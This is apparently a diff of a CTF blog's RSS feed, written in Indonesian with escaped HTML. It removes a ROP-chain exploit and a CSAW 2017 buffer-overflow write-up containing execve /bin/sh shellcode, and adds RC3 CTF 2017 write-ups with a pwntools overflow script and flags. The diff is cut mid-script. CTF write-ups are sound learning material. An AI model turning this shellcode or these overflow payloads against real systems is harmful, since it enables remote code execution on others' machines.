-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000468475&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# syscall ; ret&lt;/span&gt;
-&lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; p
-&lt;/pre&gt;
-&lt;p&gt;Jalankan script nya.&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;(python exp.py&lt;span style=&quot;color:#e28964;&quot;&gt;;&lt;/span&gt; cat) &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt; ./echo
-&lt;/pre&gt;
-&lt;p&gt;Setelah itu akan mendapatkan interactive shell.&lt;/p&gt;
-&lt;/article&gt;
+&lt;p&gt;Berikut script yang digunakan&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;18.216.183.46&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC0FFEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xCAFEF00D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{S3E_N0T_TO0_B4D_HUH_ec1368b59b858e08}&lt;/code&gt;&lt;/p&gt;
+
 </description>
-        <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
-        <link>https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html</link>
-        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017-final-pwn200.html</guid>
+        <pubDate>Tue, 21 Nov 2017 00:00:00 +0700</pubDate>
+        <link>https://rhama.my.id/ctf/2017/11/21/rc3-ctf-2017.html</link>
+        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/21/rc3-ctf-2017.html</guid>
         
-        <category>CyberJawara2017</category>
+        <category>rc3ctf</category>
         
         <category>CTF</category>
         
@@ -1479,133 +1889,125 @@ p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span sty
       </item>
     
       <item>
-        <title>CSAW CTF 2017 Prelims - Write Up</title>
-        <description>&lt;article class=&quot;post-content&quot;&gt;
-&lt;h1&gt;Pwn (75) - Pilot&lt;/h1&gt;
-&lt;pre style=&quot;background:#0d0d0d;color:#dde6cf;&quot;&gt;pilot
-Can I take your order?
-nc pwn.chal.csaw.io 8464
-&lt;/pre&gt;
-&lt;p&gt;Diberikan sebuah binary 64 bit striped.&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;a href=&quot;/cdn-cgi/l/email-protection&quot; class=&quot;__cf_email__&quot; data-cfemail=&quot;7f1b1a093f2f0811161118&quot;&gt;[email&amp;#160;protected]&lt;/a&gt;:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;/CTF/CSAW2017$ file pilot
-pilot: ELF 64-bit LSB executable, x86-64, version 1 &lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;SYSV&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&quot;color:#ff9d00;&quot;&gt;for&lt;/span&gt; &lt;span style=&quot;color:#ccc;&quot;&gt;GNU/Linux&lt;/span&gt; 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
-&lt;/pre&gt;
-&lt;p&gt;Apabila program dijalankan akan meminta command yang merupakan inputan pengguna.&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;a href=&quot;/cdn-cgi/l/email-protection&quot; class=&quot;__cf_email__&quot; data-cfemail=&quot;224647546272554c4b4c45&quot;&gt;[email&amp;#160;protected]&lt;/a&gt;:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;/CTF/CSAW2017$ ./pilot
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Welcome DropShip Pilot...
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]I am your assitant A.I....
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]I will be guiding you through the tutorial....
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]As a first step, lets learn how to land at the designated location....
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;amp;&lt;/span&gt; Medics...
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Good Luck Pilot&lt;span style=&quot;color:#ff9d00;&quot;&gt;!&lt;/span&gt;....
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Location:0x7fff7a453100
-[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Command:
-&lt;/pre&gt;
-&lt;p&gt;Dimana setelah dilakukan debugging menggunakan &lt;em&gt;&lt;strong&gt;GDB&lt;/strong&gt;&lt;/em&gt;, program tersebut vulnerable terhadap &lt;em&gt;&lt;strong&gt;Buffer Overflow&lt;/strong&gt;&lt;/em&gt; terlihat pada fungsi &lt;em&gt;&lt;strong&gt;read()&lt;/strong&gt;&lt;/em&gt; membaca 0x40 ( 64) bytes inputan pengguna yang seperti nya melebihi buffer size variable penampung yang terletak di rbp-0x20.&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400acf&lt;/span&gt;:  lea    rax,&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;rbp&lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;0x20&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt;
-   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ad3&lt;/span&gt;:  mov    edx,&lt;span style=&quot;color:#ff628c;&quot;&gt;0x40&lt;/span&gt;
-   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ad8&lt;/span&gt;:  mov    rsi,rax
-   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400adb&lt;/span&gt;:  mov    edi,&lt;span style=&quot;color:#ff628c;&quot;&gt;0x0&lt;/span&gt;
-   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ae0&lt;/span&gt;:  call   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x400820&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;lt;&lt;/span&gt;&lt;a href=&quot;/cdn-cgi/l/email-protection&quot; class=&quot;__cf_email__&quot; data-cfemail=&quot;ddafb8bcb99dadb1a9&quot;&gt;[email&amp;#160;protected]&lt;/a&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;gt;&lt;/span&gt;
+        <title>RC3 CTF 2017 Write Up</title>
+        <description>&lt;h1 id=&quot;reversing-100&quot;&gt;Reversing (100)&lt;/h1&gt;
 
-&lt;/pre&gt;
-&lt;p&gt;Didapatkan &lt;strong&gt;&lt;em&gt;Location&lt;/em&gt;&lt;/strong&gt; merupakan alamat stack dimana inputan penggunana akan disimpan dan dibutuhkan 40 bytes untuk meng &lt;em&gt;overwrite&lt;/em&gt; register RIP.&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;gdb&lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt;peda$ x&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;s &lt;span style=&quot;color:#ff628c;&quot;&gt;0x7fffffffe210&lt;/span&gt;
-&lt;span style=&quot;color:#ff628c;&quot;&gt;0x7fffffffe210&lt;/span&gt;: &lt;span style=&quot;color:#3ad900;&quot;&gt;'&lt;/span&gt;A&lt;span style=&quot;color:#3ad900;&quot;&gt;'&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;lt;&lt;/span&gt;repeats &lt;span style=&quot;color:#ff628c;&quot;&gt;40&lt;/span&gt; times&lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/pre&gt;
-&lt;p&gt;Berikut exploit code yang digunakan&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;from&lt;/span&gt; pwn &lt;span style=&quot;color:#ff9d00;&quot;&gt;import&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;
+&lt;p&gt;Diberikan file elf 64bit not stripped.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file hello
+hello: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Hanya dengan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; didapatkan Flag yang benar.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;strings hello | grep RC
+RC3-2017&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;little_ball_of_fur&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Cukup mudah untuk challenge dengan points 100 :)&lt;/p&gt;
 
-&lt;span style=&quot;color:#08f;font-style:italic;&quot;&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;#&lt;/span&gt;r = process(&quot;./true&quot;)&lt;/span&gt;
-r &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#ffee80;&quot;&gt;remote&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;pwn.chal.csaw.io&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;, &lt;span style=&quot;color:#ff628c;&quot;&gt;8464&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
-&lt;span style=&quot;color:#ffee80;&quot;&gt;r.recvuntil&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Location:&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{little_ball_of_fur}&lt;/code&gt;&lt;/p&gt;
 
-shellcode &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xff&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xf6&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xd2&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#80ff82;&quot;&gt;\x50&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;\xbb\x2f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x62&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x69&lt;/span&gt;\x6e\x2f\x2f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x73&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x68&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x53&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x89&lt;/span&gt;\xe7\xb0\x3b\x0f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x05&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;
-payload &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x90&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt; (&lt;span style=&quot;color:#ff628c;&quot;&gt;40&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt; &lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffb054;&quot;&gt;len&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;shellcode&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;)
-payload &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; shellcode &lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt; payload
+&lt;h1 id=&quot;web-100&quot;&gt;Web (100)&lt;/h1&gt;
 
-addr &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt;  &lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#80ffbb;&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;r.recv&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;14&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;,&lt;span style=&quot;color:#ff628c;&quot;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
-addr &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt;  &lt;span style=&quot;color:#ffee80;&quot;&gt;p64&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;addr&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
-payload_to_send &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; payload&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;addr
+&lt;p&gt;Diberikan sebuah website &lt;a href=&quot;http://13.59.6.98&quot;&gt;http://13.59.6.98&lt;/a&gt;&lt;/p&gt;
 
